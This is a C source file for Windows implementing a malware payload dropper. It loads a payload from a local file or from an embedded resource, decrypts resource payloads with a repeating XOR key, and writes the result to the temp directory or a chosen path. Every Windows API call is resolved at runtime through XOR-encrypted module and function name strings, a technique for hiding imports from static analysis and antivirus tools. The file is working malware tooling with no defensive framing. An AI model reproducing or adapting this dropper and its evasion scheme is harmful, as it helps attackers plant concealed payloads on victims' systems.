#include "PayloadDropper.h"
#include "DynLibResolver.h"
#include "StringCrypt.h"
#include "MemOps.h"
#include <stdio.h>

BOOL DecryptPayload(PPayload Payload, LPVOID pResourceMemory)
{
    DWORD i, j;
    for (i = 0; i < Payload->dwPayloadSize;)
    {
        for (j = 0; j < Payload->dwKeySize; j++)
        {
            *((PBYTE)Payload->pPayload + i + j) = *(PBYTE)((PBYTE)pResourceMemory + i + j) ^ *(PBYTE)(Payload->pKey + j);
        }
        //*(PSHORT)(pDecryptedResourceBuffer + i) = *(PSHORT)((ULONGLONG)pMemoryResource + i) ^ INIT_RSRC_XOR_KEY_1;
        i += Payload->dwKeySize;
    }
    return TRUE;
}

BOOL LoadPayload(PPayload Payload, HANDLE hCurrentProcessHeap)
{
    DWORD   dwCurDirSize, dwSizeOfResource, dwLocalRead;
    CHAR* pszPayloadCurDir;
    HANDLE  hLocalPayload;
    HMODULE hInstance;
    HRSRC   hResInfo;
    HGLOBAL hRes;
    LPVOID  pResourceMemory;
    PBYTE   pResourceBuffer;

    switch (Payload->dwPayloadType)
    {
    case _PayloadTypeLocal:

        dwCurDirSize = ((fp_GetCurrentDirectoryA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_GetCurrentDirectoryA])))(0, NULL);

        dwCurDirSize += (DWORD)str_len(Payload->szPayloadName) + 1;

        pszPayloadCurDir = (CHAR*)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwCurDirSize);

        if (!pszPayloadCurDir) return FALSE;

        if (!((fp_GetCurrentDirectoryA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_GetCurrentDirectoryA])))(dwCurDirSize, pszPayloadCurDir))
        {
            printf("[!] Failed to get current dir\n");
            return FALSE;
        }

        *(pszPayloadCurDir + str_len(pszPayloadCurDir)) = '\\';
        *(pszPayloadCurDir + str_len(pszPayloadCurDir) + 1) = 0;

        mem_cpy((PBYTE)Payload->szPayloadName, (PBYTE)(pszPayloadCurDir + str_len(pszPayloadCurDir)), str_len(Payload->szPayloadName));

        if ((hLocalPayload = ((fp_CreateFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_CreateFileA])))(pszPayloadCurDir,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL)) == INVALID_HANDLE_VALUE)
        {
            printf("[-] Failed to open payload");
            return FALSE;
        }

        Payload->dwPayloadSize = ((fp_GetFileSize)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_GetFileSize])))(hLocalPayload, NULL);

        Payload->pPayload = (PVOID)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, Payload->dwPayloadSize);

        if (Payload->pPayload == NULL)
        {
            printf("[-] Failed to allocate local payload");
            return FALSE;
        }

        if (!((fp_ReadFile)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_ReadFile])))(hLocalPayload, Payload->pPayload, Payload->dwPayloadSize, &dwLocalRead, NULL))
        {
            printf("[-] Failed to read local payload");
            return FALSE;
        }

        break;

    case _PayloadTypeResource:
        hInstance = ((fp_GetModuleHandleA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_GetModuleHandleA])))(NULL);

        if (!hInstance)
        {
            printf("[!] Failed to get current module\n");
            return FALSE;
        }

        hResInfo = ((fp_FindResourceA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_FindResourceA])))(hInstance, MAKEINTRESOURCEA(Payload->dwResourceId), "Data");

        if (!hResInfo)
        {
            printf("[!] Failed to get resource infos\n");
            return FALSE;
        }

        hRes = ((fp_LoadResource)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_LoadResource])))(hInstance, hResInfo);

        if (!hRes)
        {
            printf("[+] Cannot load resource\n");
            return FALSE;
        }

        pResourceMemory = ((fp_LockResource)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_LockResource])))(hRes);

        dwSizeOfResource = ((fp_SizeOfResource)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_SizeOfResource])))(hInstance, hResInfo);


        pResourceBuffer = (PBYTE)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwSizeOfResource);

        Payload->dwPayloadSize = dwSizeOfResource;
        Payload->pPayload = (PVOID)pResourceBuffer;

        DecryptPayload(Payload, pResourceMemory);

        ((fp_FreeResource)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_FreeResource])))(hRes);

        break;
    }

    return TRUE;
}

BOOL DropPayload(PPayload Payload, const CHAR* szDestinationPath, HANDLE hCurrentProcessHeap)
{
    CHAR* sTempPath;
    DWORD dwPathSize, dwTempPathLen;

    dwPathSize = szDestinationPath == NULL ? MAX_PATH : (DWORD)(str_len(Payload->szPayloadName) + str_len((CHAR*)szDestinationPath) + 1);

    sTempPath = (CHAR*)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwPathSize);

    if (sTempPath == NULL) return FALSE;

    if (szDestinationPath == NULL) {
        dwTempPathLen = ((fp_GetTempPathA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_GetTempPathA])))(MAX_PATH, sTempPath);

        if (!dwTempPathLen) {
            printf("[-] Failed to get temp path\n");
            return FALSE;
        }
    }
    else
    {
        mem_cpy((PBYTE)szDestinationPath, (PBYTE)sTempPath, str_len((CHAR*)szDestinationPath));
    }

    mem_cpy((PBYTE)Payload->szPayloadName, (PBYTE)((ULONGLONG)sTempPath + str_len(sTempPath)), str_len(Payload->szPayloadName));

    printf("[+] Dropping %s payload to %s\n", Payload->szPayloadName, sTempPath);

    HANDLE hPayload;
    if ((hPayload = ((fp_CreateFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_CreateFileA])))(sTempPath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open payload\n");
        return FALSE;
    }

    DWORD dwPayloadWrite;
    if (!((fp_WriteFile)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_WriteFile])))(hPayload, Payload->pPayload, (DWORD)Payload->dwPayloadSize, &dwPayloadWrite, NULL)) {
        printf("[-] Failed to write payload");
        ((fp_CloseHandle)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_CloseHandle])))(hPayload);
        return FALSE;
    }

    ((fp_CloseHandle)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_CloseHandle])))(hPayload);

    return TRUE;
}